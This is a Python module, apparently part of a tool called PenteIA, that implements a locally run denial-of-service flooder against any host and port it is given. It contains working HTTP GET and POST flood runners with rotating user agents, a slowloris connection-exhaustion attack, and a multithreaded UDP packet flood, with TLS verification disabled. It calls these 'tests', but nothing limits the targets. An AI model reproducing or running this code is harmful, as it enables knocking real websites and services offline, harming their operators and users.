#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Local Flood Executor — PenteIA v4.0
Executa flood diretamente na máquina local via asyncio — sem VPS, sem custo.
Mesmo interface que SSHProxyExecutor: retorna (thread, result_dict).
"""

import asyncio
import ssl
import socket
import threading
import time
import random
import string
from typing import Dict

UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Edg/119.0.0.0',
    'python-requests/2.31.0',
]

HTTP_PATHS = ['/', '/index.html', '/index.php', '/home', '/search?q=test',
              '/api/v1/status', '/products', '/login', '/sitemap.xml', '/robots.txt']

def _rand(n: int) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


class LocalFloodExecutor:
    """Flood local via asyncio — gratuito, nativo, sem VPS."""

    def __init__(self):
        self._stop_event = threading.Event()

    def stop(self):
        """Sinaliza parada — todos os runners verificam este evento."""
        self._stop_event.set()

    def start_test(self, target_host: str, target_port: int, method: str,
                   duration: int, pps: int, threads: int, endpoints: str = '') -> tuple:
        self._stop_event.clear()

        # pré-check de porta
        try:
            _c = socket.socket(); _c.settimeout(2)
            _c.connect((target_host, target_port)); _c.close()
        except Exception as e:
            msg = f'Porta {target_port} fechada/filtrada ({e})'
            result = {
                'status': 'port_closed', 'requests': 0, 'errors': 0,
                'packets': 0, 'connections': 0, 'vps_pid': 'local',
                'output': msg, 'lines': [f'PORT_CLOSED port={target_port}'], 'error': msg,
            }
            t = threading.Thread(target=lambda: None); t.start()
            return t, result

        result = {
            'status': 'running', 'requests': 0, 'errors': 0,
            'packets': 0, 'connections': 0, 'vps_pid': 'local',
            'output': 'Iniciando executor local...', 'lines': [],
        }

        runners = {
            'http_flood':       self._http_flood,
            'http_flood_async': self._http_flood,
            'serverless_flood': self._serverless_flood,
            'slowloris':        self._slowloris,
            'udp_flood':        self._udp_flood,
        }
        runner = runners.get(method, self._http_flood)

        def _run():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(
                    runner(target_host, target_port, duration, min(pps, 2000), endpoints, result)
                )
            except Exception as e:
                result['status'] = 'error'
                result['error'] = str(e)
                result['lines'].append(f'ERROR: {e}')
            finally:
                loop.close()

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        return t, result

    # ── runners ──────────────────────────────────────────────────────────────

    async def _http_flood(self, host, port, dur, concurrency, endpoints, result):
        use_ssl = port in (443, 8443)
        ctx = _ssl_ctx() if use_ssl else None
        paths = [e.strip() for e in endpoints.split(',') if e.strip()] or HTTP_PATHS

        async def worker(idx):
            end = asyncio.get_event_loop().time() + dur
            i = idx
            while asyncio.get_event_loop().time() < end and not self._stop_event.is_set():
                try:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(host, port, ssl=ctx), timeout=3
                    )
                    ua = UA_LIST[i % len(UA_LIST)]
                    path = paths[i % len(paths)]
                    i += concurrency
                    w.write((f'GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n'
                             f'Accept: */*\r\nCache-Control: no-cache\r\nConnection: close\r\n\r\n').encode())
                    await w.drain(); w.close()
                    try: await asyncio.wait_for(w.wait_closed(), timeout=1)
                    except: pass
                    result['requests'] += 1
                except:
                    result['errors'] += 1

        await self._run_workers(workers=concurrency, worker_fn=worker,
                                dur=dur, result=result, metric='requests')

    async def _serverless_flood(self, host, port, dur, concurrency, endpoints, result):
        use_ssl = port in (443, 8443)
        ctx = _ssl_ctx() if use_ssl else None
        ep_list = [e.strip() for e in endpoints.split(',') if e.strip()] or ['/api']

        async def worker(idx):
            end = asyncio.get_event_loop().time() + dur
            i = idx
            while asyncio.get_event_loop().time() < end and not self._stop_event.is_set():
                ep = ep_list[i % len(ep_list)]
                body = f'{{"q":"{_rand(12)}","page":{random.randint(1,50)},"ts":{random.randint(0,999999)}}}'.encode()
                try:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(host, port, ssl=ctx), timeout=5
                    )
                    w.write(
                        (f'POST {ep} HTTP/1.1\r\nHost: {host}\r\n'
                         f'Content-Type: application/json\r\nContent-Length: {len(body)}\r\n'
                         f'Cache-Control: no-cache, no-store\r\nConnection: close\r\n\r\n').encode() + body
                    )
                    await w.drain()
                    try: await asyncio.wait_for(r.read(8192), timeout=10)
                    except: pass
                    w.close()
                    try: await asyncio.wait_for(w.wait_closed(), timeout=1)
                    except: pass
                    result['requests'] += 1
                except:
                    result['errors'] += 1
                i += concurrency

        await self._run_workers(workers=concurrency, worker_fn=worker,
                                dur=dur, result=result, metric='requests')

    async def _slowloris(self, host, port, dur, concurrency, endpoints, result):
        use_ssl = port in (443, 8443)
        ctx = _ssl_ctx() if use_ssl else None
        sockets = []

        for _ in range(min(concurrency, 500)):
            try:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ctx), timeout=4
                )
                w.write(f'GET / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 9999\r\nX-Pad: '.encode())
                await w.drain()
                sockets.append(w)
                result['connections'] += 1
            except:
                pass

        start = asyncio.get_event_loop().time()
        end = start + dur; last = start

        while asyncio.get_event_loop().time() < end and not self._stop_event.is_set():
            alive = []
            for w in sockets:
                try:
                    w.write(b'X'); await w.drain()
                    alive.append(w)
                except:
                    pass
            sockets = alive
            result['connections'] = len(sockets)
            await asyncio.sleep(1)
            now = asyncio.get_event_loop().time()
            if now - last >= 5:
                self._progress(result, now - start, dur, 'connections')
                last = now

        for w in sockets:
            try: w.close()
            except: pass
        result['status'] = 'stopped' if self._stop_event.is_set() else 'completed'
        result['lines'].append(f'DONE connections={result["connections"]}')
        result['output'] = '\n'.join(result['lines'][-20:])

    async def _udp_flood(self, host, port, dur, concurrency, endpoints, result):
        import os
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = host
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + dur; last = time.time()

        def _send():
            while time.time() < end:
                try:
                    s.sendto(os.urandom(512), (ip, port))
                    result['packets'] += 1
                except:
                    result['errors'] += 1

        threads = [threading.Thread(target=_send, daemon=True) for _ in range(min(concurrency // 10 or 10, 50))]
        for t in threads: t.start()

        while time.time() < end:
            await asyncio.sleep(5)
            now = time.time()
            self._progress(result, now - (end - dur), dur, 'packets')
            last = now

        for t in threads: t.join(timeout=1)
        s.close()
        result['status'] = 'completed'
        result['lines'].append(f'DONE packets={result["packets"]}')
        result['output'] = '\n'.join(result['lines'][-20:])

    # ── helpers ──────────────────────────────────────────────────────────────

    async def _run_workers(self, workers, worker_fn, dur, result, metric):
        start = asyncio.get_event_loop().time()
        tasks = [asyncio.create_task(worker_fn(i)) for i in range(workers)]
        while asyncio.get_event_loop().time() < start + dur and not self._stop_event.is_set():
            await asyncio.sleep(5)
            self._progress(result, asyncio.get_event_loop().time() - start, dur, metric)
        if self._stop_event.is_set():
            for t in tasks:
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        result['status'] = 'stopped' if self._stop_event.is_set() else 'completed'
        result['lines'].append(f'DONE {metric}={result[metric]} errors={result["errors"]}')
        result['output'] = '\n'.join(result['lines'][-20:])

    def _progress(self, result: Dict, elapsed: float, dur: int, metric: str):
        elapsed = int(elapsed); remaining = max(0, dur - elapsed)
        line = (f'PROGRESS {metric}={result[metric]} errors={result["errors"]} '
                f'elapsed={elapsed}s remaining={remaining}s')
        result['lines'].append(line)
        result['output'] = '\n'.join(result['lines'][-20:])
